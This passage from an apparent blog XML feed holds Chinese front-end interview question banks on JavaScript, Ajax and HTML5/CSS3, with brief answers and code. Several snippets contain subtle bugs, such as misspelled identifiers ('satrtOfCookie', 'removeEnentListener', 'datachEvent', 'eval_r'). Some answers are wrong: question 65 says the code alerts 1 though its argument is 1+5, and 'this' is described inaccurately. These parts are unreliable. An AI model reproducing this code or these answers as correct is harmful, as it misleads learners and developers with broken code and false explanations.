";"; var searchName = "+ name + "= ""; var startOfCookie = myCookie.indexOf(searchName); var endOfCookie; if(satrtOfCookie != -1)&#123; startOfcookie += searchName.length; endOfCookie = myCookie.indexOf(";",startOfCookie); result = (myCookie.substring(startOfCookie,endOfCookie)); &#125; return result;&#125;(function()&#123; var oTips = document.getElementById('tips');//假设tips的id为tips var page = &#123; check: function() &#123;//检查tips的cookie是否存在并且允许显示 var tips = getCookie('tips'); if(!tips || tips == 'show') return true;//tips的cookie不存在 if(tips == "never_show_again") return false; &#125;, hideTip: function(bNever) &#123; if(bNever) setcookie('tips', 'never_show_again', 365); oTips.style.display = "none";//隐藏 &#125;, showTip: function() &#123; oTips.style.display = "inline";//显示，假设tips为行级元素 &#125;, init: function() &#123; var _this = this; if(this.check()) &#123; _this.showTip(); setcookie('tips', 'show', 1); &#125; oTips.onclick = function() &#123; _this.hideTip(true); &#125;; &#125; &#125;; page.init();&#125;)(); 20、说出以下函数的作用是？空白区域应该填写什么？123456789101112131415161718//define (function(window)&#123; function fn(str)&#123; this.str=str; &#125; fn.prototype.format = function()&#123; var arg = ______; return this.str.replace(_____,function(a,b)&#123; return arg[b]||""; &#125;); &#125; window.fn = fn;&#125;)(window);//use(function()&#123; var t = new fn('&lt;p&gt;&lt;a href="&#123;0&#125;"&gt;&#123;1&#125;&lt;/a&gt;&lt;span&gt;&#123;2&#125;&lt;/span&gt;&lt;/p&gt;'); console.log(t.format('http://www.alibaba.com','Alibaba','Welcome'));&#125;)(); 访函数的作用是使用format函数将函数的参数替换掉{0}这样的内容，返回一个格式化后的结果： 第一个空是：arguments第二个空是：/\{(\d+)\}/ig 21、Javascript作用链域理解变量和函数的访问范围和生命周期，全局作用域与局部作用域的区别，JavaScript中没有块作用域，函数的嵌套形成不同层次的作用域，嵌套的层次形成链式形式，通过作用域链查找属性的规则需要深入理解。 22、This对象理解不同形式的函数调用方式下的this指向，理解事件函数、定时函数中的this指向，函数的调用形式决定了this的指向。 在JavaScript中，this通常指向的是我们正在执行的函数本身，或者是，指向该函数所属的对象。全局的this → 指向的是Window函数中的this → 指向的是函数所在的对象对象中的this → 指向其本身 23、 eval它的功能是把对应的字符串解析成JS代码并运行；应该避免使用eval，不安全，非常耗性能 2个步骤: 一次解析成js语句一次执行 24、关于事件，IE与火狐的事件机制有什么区别？ 如何阻止冒泡？[1].在IE中,事件对象是作为一个全局变量来保存和维护的.所有的浏览器事件,不管是用户触发的，还是其他事件,都会更新window.event对象.所以在代码中，只要调用window.event就可以获取事件对象， 再event.srcElement就可以取得触发事件的元素进行进一步处理.[2].在FireFox中，事件对象却不是全局对象，一般情况下，是现场发生，现场使用，FireFox把事件对象自动传给事件处理程序. 25、什么是闭包（closure），为什么要用它？ 简单的理解是函数的嵌套形成闭包，闭包包括函数本身已经它的外部作用域使用闭包可以形成独立的空间，延长变量的生命周期，报存中间状态值 执行say667()后,say667()闭包内部变量会存在, 而闭包内部函数的内部变量不会存在.使得Javascript的垃圾回收机制GC不会收回say667()所占用的资源，因为say667()的内部函数的执行需要依赖say667()中的变量。这是对闭包作用的非常直白的描述. 123456789function say667() &#123; // Local variable that ends up within closure var num = 666; var sayAlert = function() &#123; alert(num); &#125; num++; return sayAlert;&#125;var sayAlert = say667();sayAlert()//执行结果应该弹出的667 26、javascript 代码中的”use strict”; 是什么意思 ? 使用它区别是什么？意思是使用严格模式，使用严格模式，一些不规范的语法将不再支持 27、如何判断一个对象是否属于某个类？Instanceof constructor 28、new操作符具体干了什么呢? 创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。属性和方法被加入到 this 引用的对象中。新创建的对象由 this 所引用，并且最后隐式的返回 this 。 123var obj = &#123;&#125;;obj.__proto__ = Base.prototype;Base.call(obj); 29、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？HasOwnProperty 30、对JSON的了解轻量级数据交互格式，可以形成复杂的嵌套格式，解析非常方便 31、js延迟加载的方式有哪些 方案一：&lt;script&gt;标签的async=&quot;async&quot;属性方案二：&lt;script&gt;标签的defer=&quot;defer&quot;属性方案三：动态创建&lt;script&gt;标签方案四：AJAX eval（使用AJAX得到脚本内容，然后通过eval_r(xmlhttp.responseText)来运行脚本）方案五：iframe方式 32、模块化开发怎么做？ 浏览器端 requirejs，seajs；服务器端 nodejs；ES6模块化；fis、webpack 等前端整体模块化解决方案；grunt、gulp等前端工作流的使用 33、AMD（Modules/Asynchronous-Definition）、CMD（Common Module Definition）规范区别理解这两种规范的差异，主要通过requirejs与seajs的对比，理解模块的定义与引用方式的差异以及这两种规范的设计原则 34、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何缓存的？） 核心是js的加载模块，通过正则匹配模块以及模块的依赖关系，保证文件加载的先后顺序根据文件的路径对加载过的文件做了缓存 35、自己设计实现一个 requireJS，你会怎么做？核心是实现js的加载模块，维护js的依赖关系，控制好文件加载的先后顺序 36、对ECMAScript6的了解ES6新的语法糖，类，模块化等新特性 37、ECMAScript6 怎么写class么，为什么会出现class这种东西?123456789class Point &#123; constructor(x, y) &#123; this.x = x; this.y = y; &#125; toString() &#123; return '('+this.x+', '+this.y+')'; &#125;&#125; 39、数组和对象有哪些原生方法 Array.concat( ) 连接数组Array.join( ) 将数组元素连接起来以构建一个字符串Array.length 数组的大小Array.pop( ) 删除并返回数组的最后一个元素Array.push( ) 给数组添加元素Array.reverse( ) 颠倒数组中元素的顺序Array.shift( ) 将元素移出数组Array.slice( ) 返回数组的一部分Array.sort( ) 对数组元素进行排序Array.splice( ) 插入、删除或替换数组的元素Array.toLocaleString( ) 把数组转换成局部字符串Array.toString( ) 将数组转换成一个字符串Array.unshift( ) 在数组头部插入一个元素Object.hasOwnProperty( ) 检查属性是否被继承Object.isPrototypeOf( ) 一个对象是否是另一个对象的原型Object.propertyIsEnumerable( ) 是否可以通过for/in循环看到属性Object.toLocaleString( ) 返回对象的本地字符串表示Object.toString( ) 定义一个对象的字符串表示Object.valueOf( ) 指定对象的原始值 40、JS 怎么实现一个类。怎么实例化这个类 严格来讲js中并没有类的概念不过js中的函数可以作为构造函数来使用通过new来实例化，其实函数本身也是一个对象。 41、JavaScript中的作用域与变量声明提升？ 理解JavaScript的预解析机制js的运行主要分两个阶段js的预解析和运行预解析阶段所有的变量声明和函数定义都会提前，但是变量的赋值不会提前 42、如何编写高性能的Javascript 使用 DocumentFragment 优化多次 append通过模板元素 clone ，替代 createElement使用一次 innerHTML 赋值代替构建 dom 元素使用 firstChild 和 nextSibling 代替 childNodes 遍历 dom 元素使用 Array 做为 StringBuffer ，代替字符串拼接的操作将循环控制量保存到局部变量顺序无关的遍历时，用 while 替代 for将条件分支，按可能性顺序从高到低排列在同一条件子的多（ &gt;2 ）条件分支时，使用 switch 优于 if使用三目运算符替代条件分支需要不断执行的时候，优先考虑使用 setInterval 43、那些操作会造成内存泄漏闭包，循环 44、javascript对象的几种创建方式 工厂模式构造函数模式原型模式混合构造函数和原型模式动态原型模式寄生构造函数模式稳妥构造函数模式 45、javascript 继承的 6 种方法？ 原型链继承借用构造函数继承组合继承(原型+借用构造)原型式继承寄生式继承寄生组合式继承 46、eval 它的功能是把对应的字符串解析成JS代码并运行应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行） 47、JavaScript 原型，原型链 ? 有什么特点？ 原型对象也是普通的对象，是对象一个自带隐式的__proto__属性，原型也有可能有自己的原型，如果一个原型对象的原型不为 null 的话，我们就称之为原型链原型链是由一些用来继承和共享属性的对象组成的（有限的）对象链 JavaScript的数据对象有那些属性值 writable：这个属性的值是否可以改。configurable：这个属性的配置是否可以删除，修改。enumerable：这个属性是否能在for…in循环中遍历出来或在Object.keys中列举出来。value：属性值。 当我们需要一个属性的时，Javascript引擎会先看当前对象中是否有这个属性， 如果没有的话，就会查找他的Prototype对象是否有这个属性。 123456789101112function clone(proto) &#123; function Dummy() &#123; &#125; Dummy.prototype = proto; Dummy.prototype.constructor = Dummy; return new Dummy(); //等价于Object.create(Person);&#125; function object(old) &#123; function F() &#123;&#125;; F.prototype = old; return new F();&#125;var newObj = object(oldObject); 48、事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？ 我们在网页中的某个操作（有的操作对应多个事件）。例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件ev.stopPropagation(); 注意旧ie的方法：ev.cancelBubble = true; 49、简述一下Sass、Less，且说明区别他们是动态的样式语言，是 CSS 预处理器, CSS 上的一种抽象层。他们是一种特殊的语法/语言而编译成CSS。 变量符不一样，less 是 @，而 Sass 是 $; Sass支持条件语句，可以使用 if{}else{}, for{} 循环等等。而 Less 不支持;Sass是基于 Ruby 的，是在服务端处理的，而 Less 是需要引入 less.js 来处理 Less 代码输出 Css 到浏览器 50、关于javascript中apply()和call()方法的区别？ 相同点:两个方法产生的作用是完全一样的不同点:方法传递的参数不同Object.call(this,obj1,obj2,obj3)Object.apply(this,arguments)apply()接收两个参数，一个是函数运行的作用域(this)，另一个是参数数组。call()方法第一个参数与apply()方法相同，但传递给函数的参数必须列举出来。 1234567function add(a,b)&#123; alert(a+b);&#125;function sub(a,b)&#123; alert(a-b);&#125;add.call(sub,3,1); 例子中用 add 来替换 sub，add.call(sub,3,1) == add(3,1) ，所以运行结果为：alert(4); 注意：js 中的函数其实是对象，函数名是对 Function 对象的引用。 51、分别阐述split(),slice(),splice(),join() join()用于把数组中的所有元素拼接起来放入一个字符串。所带的参数为分割字符串的分隔符，默认是以逗号分开。归属于Arraysplit()即把字符串分离开，以数组方式存储。归属于Stringstringslice() 方法可从已有的数组中返回选定的元素。该方法并不会修改数组，而是返回一个子数组。如果想删除数组中的一段元素，应该使用方法 Array.splice()splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。返回的是含有被删除的元素的数组。 52、事件委托让利用事件冒泡的原理，让自己的所触发的事件，让他的父元素代替执行！ 53、如何阻止事件冒泡和默认事件阻止浏览器的默认行为 window.event?window.event.returnValue = false: e.preventDefault(); 停止事件冒泡 window.event?window.event.cancelBubble = true:e.stopPropagation(); 原生的 和 jQuery 的 原生JavaScript中，return false;只阻止默认行为，不阻止冒泡，jQuery中的return false;既阻止默认行为，又阻止冒泡 54、require.js 有什么特性 实现js文件的异步加载，避免网页失去响应；管理模块之间的依赖性，便于代码的编写和维护。 55、谈一下JS中的递归函数，并且用递归简单实现阶乘？递归即是程序在执行过程中不断调用自身的编程技巧，当然也必须要有一个明确的结束条件，不然就会陷入死循环。 56、请用正则表达式写一个简单的邮箱验证/^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/; 57、简述一下你对web性能优化的方案 尽量减少 HTTP 请求使用浏览器缓存使用压缩组件图片、JS的预载入将脚本放在底部将样式文件放在页面顶部使用外部的JS和CSS精简代码 58、在JS中有哪些会被隐式转换为false Undefined、null、关键字false、NaN、零、空字符串 59、定时器 setInterval 有一个有名函数 fn1，setInterval（fn1,500）与 setInterval（fn1(),500）有什么区别第一个是重复执行每 500 毫秒执行一次，后面一个只执行一次。 60、外部 JS 文件出现中文字符，会出现什么问题，怎么解决会出现乱码，加 charset=&quot;GB2312&quot;; 61、谈谈浏览器的内核，并且说一下什么是内核 Trident ([‘traɪd(ə)nt])–IEGecko ([‘gekəʊ])–FirefoxPresto ([‘prestəʊ])–operawebkit—谷歌和Safari 浏览器内核又可以分成两部分：渲染引擎和 JS 引擎。它负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。JS 引擎则是解析 Javascript 语言，执行 javascript 语言来实现网页的动态效果。 62、写一个通用的事件侦听器函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677// event(事件)工具集mhq.Event = &#123; // 页面加载完成后 readyEvent: function(fn) &#123; if (fn == null) &#123; fn = document; &#125; var oldonload = window.onload; if (typeof window.onload != 'function') &#123; window.onload = fn; &#125; else &#123; window.onload = function() &#123; oldonload(); fn(); &#125;; &#125; &#125;, // 视能力分别使用dom0||dom2||IE方式 来绑定事件 // 参数： 操作的元素,事件名称 ,事件处理程序 addEvent: function(element, type, handler) &#123; if (element.addEventListener) &#123; //事件类型、需要执行的函数、是否捕捉 element.addEventListener(type, handler, false); &#125; else if (element.attachEvent) &#123; element.attachEvent('on' + type, function() &#123; handler.call(element); &#125;); &#125; else &#123; element['on' + type] = handler; &#125; &#125;, // 移除事件 removeEvent: function(element, type, handler) &#123; if (element.removeEnentListener) &#123; element.removeEnentListener(type, handler, false); &#125; else if (element.datachEvent) &#123; element.detachEvent('on' + type, handler); &#125; else &#123; element['on' + type] = null; &#125; &#125;, // 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获) stopPropagation: function(ev) &#123; if (ev.stopPropagation) &#123; ev.stopPropagation(); &#125; else &#123; ev.cancelBubble = true; &#125; &#125;, // 取消事件的默认行为 preventDefault: function(event) &#123; if (event.preventDefault) &#123; event.preventDefault(); &#125; else &#123; event.returnValue = false; &#125; &#125;, // 获取事件目标 getTarget: function(event) &#123; return event.target || event.srcElement; &#125;, // 获取event对象的引用，取到事件的所有信息，确保随时能使用event； getEvent: function(e) &#123; var ev = e || window.event; if (!ev) &#123; var c = this.getEvent.caller; while (c) &#123; ev = c.arguments[0]; if (ev &amp;&amp; Event == ev.constructor) &#123; break; &#125; c = c.caller; &#125; &#125; return ev; &#125;&#125;; 63、如何判断一个对象是否属于某个类使用instanceof （待完善） 123if(a instanceof Person)&#123; alert('yes');&#125; 64、模块化怎么做立即执行函数,不暴露私有成员 12345678910111213var module1 = (function()&#123; var _count = 0; var m1 = function()&#123; //... &#125;; var m2 = function()&#123; //... &#125;; return &#123; m1 : m1, m2 : m2 &#125;;&#125;)(); 65、告诉我答案是多少？1234(function(x)&#123;delete x;alert(x);&#125;)(1+5); 函数参数无法 delete 删除，delete 只能删除通过 for in 访问的属性。当然，删除失败也不会报错，所以代码运行会弹出 1。 66、Jquery 与 jQuery UI 有啥区别？ jQuery是一个js库，主要提供的功能是选择器，属性修改和事件绑定等等。jQuery UI则是在jQuery的基础上，利用jQuery的扩展性，设计的插件。 提供了一些常用的界面元素，诸如对话框、拖动行为、改变大小行为等等 67、jquery 中如何将数组转化为json字符串，然后再转化回来jQuery中没有提供这个功能，所以你需要先编写两个jQuery的扩展： 12345678$.fn.stringifyArray = function(array) &#123; return JSON.stringify(array);&#125;$.fn.parseArray = function(array) &#123; return JSON.parse(array);&#125; // 然后调用：$("").stringifyArray(array); 68、http状态码有那些？分别代表是什么意思？ 100-199 用于指定客户端应相应的某些动作。200-299 用于表示请求成功。300-399 用于已经移动的文件并且常被包含在定位头信息中指定新的地址信息。400-499 用于指出客户端的错误。400 语义有误，当前请求无法被服务器理解。401 当前请求需要用户验证403 服务器已经理解请求，但是拒绝执行它。500-599 用于支持服务器错误。503 – 服务不可用]]></content>
      <categories>
        <category>题库系列</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[题库-Ajax]]></title>
    <url>%2F2016%2F06%2F18%2F%E9%A2%98%E5%BA%93-Ajax%2F</url>
    <content type="text"><![CDATA[1、Ajax 是什么? 如何创建一个Ajax？ Ajax并不算是一种新的技术，全称是asychronous javascript and xml，可以说是已有技术的组合主要用来实现客户端与服务器端的异步通信效果，实现页面的局部刷新早期的浏览器并不能原生支持ajax，可以使用隐藏帧（iframe）方式变相实现异步效果后来的浏览器提供了对ajax的原生支持使用ajax原生方式发送请求主要通过 XMLHttpRequest(标准浏览器)、ActiveXObject(IE浏览器)对象实现异步通信效果 基本步骤： 12345678910var xhr = null;//创建对象 if (window.XMLHttpRequest) &#123; xhr = new XMLHttpRequest();&#125; else &#123; xhr = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125;xhr.open(&quot;方式&quot;,&quot;地址&quot;,&quot;标志位&quot;);//初始化请求 xhr.setRequestHeader(&quot;&quot;,&quot;&quot;);//设置http头信息 xhr.onreadystatechange = function() &#123;&#125;//指定回调函数 xhr.send();//发送请求 js框架（jQuery/EXTJS等）提供的 ajax API对原生的ajax进行了封装，熟悉了基础理论， 2、同步和异步的区别同步：阻塞的 张三叫李四去吃饭，李四一直忙得不停，张三一直等着，直到李四忙完两个人一块去吃饭浏览器向服务器请求数据，服务器比较忙，浏览器一直等着（页面白屏），直到服务器返回数据，浏览器才能显示页面 异步：非阻塞的 张三叫李四去吃饭，李四在忙，张三说了一声然后自己就去吃饭了，李四忙完后自己去吃浏览器向服务器请求数据，服务器比较忙，浏览器可以自如的干原来的事情（显示页面）服务器返回数据的时候通知浏览器一声，浏览器把返回的数据再渲染到页面，局部更新 3、如何解决跨域问题理解跨域的概念：协议、域名、端口都相同才同域，否则都是跨域 出于安全考虑，服务器不允许 ajax 跨域获取数据，但是可以跨域获取文件内容；所以基于这一点，可以动态创建 script 标签，使用标签的 src 属性访问 js 文件的形式获取 js 脚本；这个 js 脚本中的内容是函数调用，该函数调用的参数是服务器返回的数据；为了获取这里的参数数据，需要事先在页面中定义回调函数；在回调函数中处理服务器返回的数据，这就是解决跨域问题的主流解决方案 4、页面编码和被请求的资源编码如果不一致如何处理 对于ajax请求传递的参数，如果是get请求方式，参数如果传递中文;在有些浏览器会乱码，不同的浏览器对参数编码的处理方式不同；所以对于 get 请求的参数需要使用 encodeURIComponent 函数对参数进行编码处理；后台开发语言都有相应的解码 api；对于 post 请求不需要进行编码。 5、简述 ajax 的过程 创建 XMLHttpRequest 对象,也就是创建一个异步调用对象创建一个新的 HTTP 请求,并指定该HTTP请求的方法、URL 及验证信息设置响应 HTTP 请求状态变化的函数发送 HTTP 请求获取异步调用返回的数据使用 JavaScript 和 DOM 实现局部刷新 6、异步加载 异步加载的方案： 动态插入 script 标签通过 ajax 去获取 js 代码，然后通过 eval 执行script 标签上添加 defer 或者 async 属性创建并插入 iframe，让它异步执行 js 7、JavaScript 的同源策略。 同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。所谓同源指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。 8、GET 和 POST 的区别，何时使用 POST GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符，有的浏览器是8000个字符POST：一般用于修改服务器上的资源，对所发送的信息没有限制 在以下情况中，请使用 POST 请求： 无法使用缓存文件（更新服务器上的文件或数据库）向服务器发送大量数据（POST 没有数据量限制）发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠 9、ajax 是什么 ajax 的交互模型 同步和异步的区别 如何解决跨域问题 通过异步模式，提升了用户体验优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用Ajax在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。 10、 Ajax的最大的特点是什么。 Ajax可以实现异步通信效果，实现页面局部刷新，带来更好的用户体验；按需获取数据，节约带宽资源； 11、ajax的缺点 ajax不支持浏览器back按钮。安全问题 AJAX暴露了与服务器交互的细节。对搜索引擎的支持比较弱。破坏了程序的异常机制。 12、ajax 请求的时候 get 和 post 方式的区别 get 一般用来进行查询操作，url 地址有长度限制，请求的参数都暴露在 url 地址当中，如果传递中文参数，需要自己进行编码操作，安全性较低。post 请求方式主要用来提交数据，没有数据长度的限制，提交的数据内容存在于 http 请求体中，数据不会暴漏在 url 地址中。 13、解释jsonp的原理，以及为什么不是真正的ajaxJsonp并不是一种数据格式，而json是一种数据格式，jsonp是用来解决跨域获取数据的一种解决方案，具体是通过动态创建script标签，然后通过标签的src属性获取js文件中的js脚本，该脚本的内容是一个函数调用，参数就是服务器返回的数据，为了处理这些返回的数据，需要事先在页面定义好回调函数，本质上使用的并不是ajax技术 14、什么是 Ajax 和 JSON ，它们的优缺点 Ajax是全称是asynchronous JavaScript andXML，即异步JavaScript和xml，用于在Web页面中实现异步数据交互，实现页面局部刷新。 优点：可以使得页面不重载全部内容的情况下加载局部内容，降低数据传输量，避免用户不断刷新或者跳转页面，提高用户体验缺点：对搜索引擎不友好；要实现ajax下的前后退功能成本较大；可能造成请求数的增加跨域问题限制； JSON是一种轻量级的数据交换格式，ECMA的一个子集 优点：轻量级、易于人的阅读和编写，便于机器（JavaScript）解析，支持复合数据类型（数组、对象、字符串、数字） 15、http常见的状态码有哪些 分别代表是什么意思 200 - 请求成功301 - 资源（网页等）被永久转移到其它URL404 - 请求的资源（网页等）不存在500 - 内部服务器错误 16、一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？分为4个步骤： 当发送一个 URL 请求时，不管这个 URL 是 Web 页面的 URL 还是 Web 页面上每个资源的 URL，浏览器都会开启一个线程来处理这个请求，同时在远程 DNS 服务器上启动一个 DNS 查询。这能使浏览器获得请求对应的 IP 地址。浏览器与远程 Web 服务器通过 TCP 三次握手协商来建立一个 TCP/IP 连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。一旦 TCP/IP 连接建立，浏览器会通过该连接向远程服务器发送 HTTP 的 GET 请求。远程服务器找到资源并使用 HTTP 响应返回该资源，值为 200 的 HTTP 响应状态表示一个正确的响应。此时，Web 服务器提供资源服务，客户端开始下载资源。 17、ajax请求的时候get 和post方式的区别 get 一般用来进行查询操作，url 地址有长度限制，请求的参数都暴露在 url 地址当中，如果传递中文参数，需要自己进行编码操作，安全性较低。post 请求方式主要用来提交数据，没有数据长度的限制，提交的数据内容存在于 http 请求体中，数据不会暴漏在 url 地址中。 18、ajax请求时，如何解释json数据 使用eval() 或者JSON.parse() 鉴于安全性考虑，推荐使用JSON.parse()更靠谱，对数据的安全性更好。 19、为什么利用多个域名来存储网站资源会更有效？确保用户在不同地区能用最快的速度打开网站，其中某个域名崩溃用户也能通过其他域名访问网站，并且不同的资源放到不同的服务器上有利于减轻单台服务器的压力。 20、请说出三种减低页面加载时间的方法 压缩css、js文件合并js、css文件，减少http请求外部js、css文件放在最底下减少dom操作，尽可能用变量替代不必要的 dom 操作 21、HTTP状态码都有那些。 200 OK //客户端请求成功400 Bad Request //客户端请求有语法错误，不能被服务器所理解403 Forbidden //服务器收到请求，但是拒绝提供服务404 Not Found //请求资源不存在，输入了错误的URL500 Internal Server Error //服务器发生不可预期的错误503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常]]></content>
      <categories>
        <category>题库系列</category>
      </categories>
      <tags>
        <tag>Ajax</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[题库-HTML5、CSS3]]></title>
    <url>%2F2016%2F06%2F08%2F%E9%A2%98%E5%BA%93-HTML5%E3%80%81CSS3%2F</url>
    <content type="text"><![CDATA[1、CSS3有哪些新特性 CSS3实现圆角（border-radius），阴影（box-shadow），对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);// 旋转,缩放,定位,倾斜增加了更多的CSS选择器多背景rgba、hlsa在CSS3中唯一引入的伪元素是 ::selection.媒体查询，多栏布局border-image 2、html5有哪些新特性、移除了那些元素？ 如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？ 新特性： 拖拽释放(Drag and drop) API语义化更好的内容标签（header, nav, footer, aside, article, section）音频、视频 API(audio,video)画布(Canvas) API地理(Geolocation) API本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；sessionStorage 的数据在浏览器关闭后自动删除表单控件，calendar、date、time、email、url、search新的技术 webworker, websocket, Geolocation 移除的元素： 纯表现的元素：basefont，big，center，font, s，strike，tt，u；对可用性产生负面影响的元素：frame，frameset，noframes； 支持HTML5新标签： IE8/IE7/IE6支持通过 document.createElement 方法产生的标签，可以利用这一特性让这些浏览器支持 HTML5 新标签，浏览器支持新标签后，还需要添加标签默认的样式（当然最好的方式是直接使用成熟的框架、使用最多的是html5shim框架）： 123&lt;!--[if lt IE 9]&gt;&lt;script&gt; src="http://html5shim.googlecode.com/svn/trunk/html5.js"&lt;/script&gt;&lt;![endif]--&gt; 如何区分：DOCTYPE声明新增的结构元素、功能元素 3、本地存储（Local Storage ）和 cookies（储存在用户本地终端上的数据）之间的区别 Cookies: 服务器和客户端都可以访问；大小只有 4KB 左右；有有效期，过期后将会删除；本地存储：只有本地浏览器端可访问数据，服务器不能访问本地存储直到故意通过 POST 或者 GET 的通道发送到服务器；每个域 5MB ；没有过期数据，它将保留知道用户从浏览器清除或者使用 JavaScript 代码移除 4、如何实现浏览器内多个标签页之间的通信调用 localstorge、cookies 等本地存储方式 5、如何对网站的文件和资源进行优化 文件合并文件最小化/文件压缩使用CDN托管缓存的使用 6、什么是响应式设计？ 它是关于网页制作的过程中让不同的设备有不同的尺寸和不同的功能。响应式设计是让所有的人能在这些设备上让网站运行正常 7、新的 HTML5 文档类型和字符集是？ HTML5文档类型：&lt;!doctype html&gt;HTML5使用的编码: &lt;meta charset=”UTF-8”&gt; 8、HTML5 Canvas 元素有什么用 Canvas 元素用于在网页上绘制图形，该元素标签强大之处在于可以直接在 HTML 上进行图形操作。 9、HTML5 存储类型有什么区别 Media APIText Track APIApplication Cache APIUser InteractionData Transfer APICommand APIConstraint Validation APIHistory API 10、用 H5+CSS3 解决导航栏最后一项掉下来的问题11、CSS3新增伪类有那些 p:first-of-type 选择属于其父元素的首个 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。p:last-of-type 选择属于其父元素的最后 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。p:only-of-type 选择属于其父元素唯一的 &lt;p&gt; 元素的每个 &lt;p&gt; 元素。p:only-child 选择属于其父元素的唯一子元素的每个 &lt;p&gt; 元素。p:nth-child(2) 选择属于其父元素的第二个子元素的每个 &lt;p&gt; 元素。:enabled、:disabled 控制表单控件的禁用状态。:checked，单选框或复选框被选中。 12、你怎么来实现页面设计图，你认为前端应该如何高质量完成工作? 一个满屏品字布局 如何设计 首先划分成头部、body、脚部；。。。。。实现效果图是最基本的工作，精确到2px；与设计师，产品经理的沟通和项目的参与做好的页面结构，页面重构和用户体验处理hack，兼容、写出优美的代码格式针对服务器的优化、拥抱 HTML5。 13、为什么利用多个域名来存储网站资源会更有效 CDN缓存更方便突破浏览器并发限制节约cookie带宽节约主域名的连接数，优化页面响应速度防止不必要的安全问题 14、知道css有个content属性吗？有什么作用？有什么应用？css的content属性专门应用在 before/after 伪元素上，用来插入生成内容。最常见的应用是利用伪类清除浮动。 1234567891011/* 一种常见利用伪类清除浮动的代码 */.clearfix:after &#123; content: "."; /* 这里利用到了content属性 */ display: block; height: 0; visibility: hidden; clear: both; &#125;.clearfix &#123; *zoom: 1; &#125; after伪元素通过 content 在元素的后面生成了内容为一个点的块级素，再利用 clear:both 清除浮动。 知道css计数器（序列数字字符自动递增）吗？如何通过 css content 属性实现 css 计数器？ css计数器是通过设置 counter-reset 、counter-increment 两个属性 、及 counter()/counters()一个方法配合after / before 伪类实现。 15、如何在 HTML5 页面中嵌入音频HTML 5 包含嵌入音频文件的标准方式，支持的格式包括 MP3、Wav 和 Ogg： 1234&lt;audio controls&gt; &lt;source src="jamshed.mp3" type="audio/mpeg"&gt; Your browser does'nt support audio embedding feature. &lt;/audio&gt; 16、如何在 HTML5 页面中嵌入视频？和音频一样，HTML5 定义了嵌入视频的标准方法，支持的格式包括：MP4、WebM 和 Ogg： 1234&lt;video width="450" height="340" controls&gt; &lt;source src="jamshed.mp4" type="video/mp4"&gt; Your browser does'nt support video embedding feature. &lt;/video&gt; 17、HTML5 引入什么新的表单属性 Datalistdatetimeoutputkeygendatemonthweektimenumberrangeemailurl 18、描述一段语义的html代码（HTML5中新增加的很多标签（如：&lt;article&gt;、&lt;nav&gt;、&lt;header&gt;和&lt;footer&gt;等，就是基于语义化设计原则） 1234&lt;div id=&quot;header&quot;&gt;&lt;h1&gt;标题&lt; /h1&gt;&lt;h2&gt;专注Web前端技术&lt; /h2&gt;&lt;/div&gt; 语义 HTML 具有以下特性： 文字包裹在元素中，用以反映内容。例如：段落包含在 &lt;p&gt; 元素中。顺序表包含在&lt;ol&gt;元素中。从其他来源引用的大型文字块包含在&lt;blockquote&gt;元素中。HTML 元素不能用作语义用途以外的其他目的。例如：&lt;h1&gt;包含标题，但并非用于放大文本。&lt;blockquote&gt;包含大段引述，但并非用于文本缩进。空白段落元素 ( &lt;p&gt;&lt;/p&gt; ) 并非用于跳行。文本并不直接包含任何样式信息。例如：不使用 &lt;font&gt; 或&lt;center&gt; 等格式标记。类或 ID 中不引用颜色或位置。 19、HTML5和CSS3的新标签 HTML5： nav, footer, header, section, hgroup, video, time, canvas, audio…CSS3: RGBA, opacity, text-shadow, box-shadow, border-radius, border-image, border-color, transform…;]]></content>
      <categories>
        <category>题库系列</category>
      </categories>
      <tags>
        <tag>HTML5，CSS3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[题库-js篇(下)]]></title>
    <url>%2F2016%2F05%2F18%2F%E9%A2%98%E5%BA%93-js%E7%AF%87%EF%BC%88%E4%B8%8B%EF%BC%89%2F</url>
